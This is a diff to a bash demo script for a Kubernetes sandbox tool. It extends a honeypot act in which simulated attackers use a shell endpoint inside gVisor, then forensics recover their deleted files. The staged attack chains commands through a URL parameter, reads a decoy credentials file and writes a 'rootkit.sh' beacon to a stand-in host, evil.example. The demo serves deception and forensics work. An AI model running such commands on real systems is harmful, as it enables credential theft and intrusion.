@@ -535,25 +535,59 @@ act3_tenantdb() {
 act4_honeypot() {
   ensure_router_port_forward
   banner "ACT IV: 'The Truman Show Honeypot' — On-Demand Per-Attacker gVisor Deception"
-  reset_act_resources honeypot-203-0-113-5 honeypot-198-51-100-9
+  reset_act_resources honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab
+  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true
 
-  step "1. Create honeypot actors for two suspicious scanner IPs"
+  local honeypot_port="${HONEYPOT_PORT:-8084}"
+  local honeypot_url="http://localhost:${honeypot_port}"
+
+  echo "Starting Truman Show Split-Screen Honeypot UI on ${honeypot_url}..."
+  (
+    cd "${REPO_ROOT}"
+    go run ./cmd/honeypot \
+      --mode=gateway \
+      --addr=":${honeypot_port}" \
+      --atespace="${ATESPACE}" \
+      --template=honeypot \
+      --router-url="${ROUTER_URL}" >/dev/null 2>&1
+  ) &
+  HONEYPOT_GW_PID=$!
+  trap 'kill "${PORT_FORWARD_PID:-}" "${HONEYPOT_GW_PID:-}" 2>/dev/null || true' EXIT
+
+  echo ""
+  echo "  Split-Screen Truman Show Director's Booth : ${honeypot_url}"
+  echo ""
+
+  step "1. Create gVisor honeypot actors for two suspicious scanner IPs"
   run_cmd kubectl ate create actor honeypot-203-0-113-5 -a "${ATESPACE}" --template honeypot
   run_cmd kubectl ate create actor honeypot-198-51-100-9 -a "${ATESPACE}" --template honeypot
 
-  step "2. Attacker 203.0.113.5 'compromises' their sandbox and drops /tmp/honeypot/rootkit.sh"
+  step "2. Attacker 203.0.113.5 exploits /shell (real sh in gVisor), steals decoy DB creds, and plants /tmp/honeypot/rootkit.sh -> Auto-Checkpoint saved!"
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" \
-    "${ROUTER_URL}/?drop_file=rootkit.sh&content=curl+evil.example/beacon&cmd=id"
+    "${ROUTER_URL}/shell?cmd=id+%26%26+cat+payroll_db_credentials.env.bak+%26%26+echo+'curl+evil.example/beacon'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh+%26%26+ls+-la"
+  run_cmd kubectl ate save actor honeypot-203-0-113-5 -a "${ATESPACE}"
 
   step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (\$0 compute while idle)"
   run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}"
 
-  step "4. Meanwhile, Attacker 198.51.100.9 probes the system and sees a completely clean filesystem"
-  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/"
+  step "4. Meanwhile, Attacker 198.51.100.9 probes /shell and sees a completely clean Golden Snapshot filesystem"
+  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/shell?cmd=ls+-la"
 
-  step "5. Weeks later, Attacker 203.0.113.5 returns — their sandbox wakes in ~100ms with rootkit.sh still in /tmp!"
-  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/?cmd=ls+-la+/tmp/honeypot"
+  step "5. Weeks later, Attacker 203.0.113.5 returns (rootkit.sh is still there!) and runs 'rm -f rootkit.sh' to wipe their tracks"
+  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/shell?cmd=ls+-la+%26%26+rm+-f+rootkit.sh+%26%26+ls+-la"
 
+  step "6. SOC Director Reveal: inspect /forensics (Canary Alerts + DELETED rootkit.sh), then REVERT the rm -f wipe to recover the malware!"
+  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"
+  run_cmd kubectl ate revert actor honeypot-203-0-113-5 -a "${ATESPACE}"
+  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-203-0-113-5" "${ROUTER_URL}/forensics"
+
+  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
+    echo ""
+    echo ">>> Truman Show Split-Screen UI (${honeypot_url}) is still live!"
+    read -r -p "    [Press Enter when finished exploring the browser UI] " _
+  fi
+
+  kill "${HONEYPOT_GW_PID:-}" 2>/dev/null || true
   free_workers
 }
 
@@ -590,10 +624,11 @@ run_all_acts() {
 cleanup_all() {
   banner "Cleaning up 'Anything But Agents' resources"
   cleanup_dungeon2d_gateway
-  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 db-acme db-globex honeypot-203-0-113-5 honeypot-198-51-100-9 raft-leader-1; do
+  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 db-acme db-globex honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1; do
     kubectl ate delete actor "${actor}" -a "${ATESPACE}" --any-state 2>/dev/null || true
   done
   kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
+  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true
   for tmpl in dungeon dungeon2d coldstart tenantdb honeypot timewarp; do
     kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
   done
